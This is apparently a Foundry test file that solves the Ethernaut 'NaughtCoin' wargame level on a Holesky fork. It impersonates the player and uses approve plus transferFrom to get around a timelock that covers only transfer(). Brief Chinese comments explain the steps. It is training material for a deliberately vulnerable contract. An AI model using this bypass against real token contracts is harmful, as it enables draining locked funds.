// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "../../lib/forge-std/src/Test.sol";
import {Vm} from "../../lib/forge-std/src/Vm.sol";
import {NaughtCoin} from "../../src/Ethernaut/NaughtCoin.sol";

contract NaughtCoinAttack is Test {
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("holesky"));
    }

    function testExploit() public {
        address playerAddress = 0xB3D6fac08D421164A414970D5225845b3A91F33F;

        vm.startPrank(playerAddress, playerAddress);
        NaughtCoin naughtCoin = NaughtCoin(
            0x0E6Eb6691AAbFc9b8D8CE1E4B9D8640034Ed9C29
        );
        naughtCoin.approve(playerAddress, naughtCoin.INITIAL_SUPPLY()); // transferFrom前需要approve，不像transfer
        naughtCoin.transferFrom(
            playerAddress,
            address(0x0E6Eb6691AAbFc9b8D8CE1E4B9D8640034Ed9C29), // 不能往0地址转
            naughtCoin.INITIAL_SUPPLY()
        );
        vm.stopPrank();

        assertTrue(naughtCoin.balanceOf(playerAddress) == 0);
    }
}
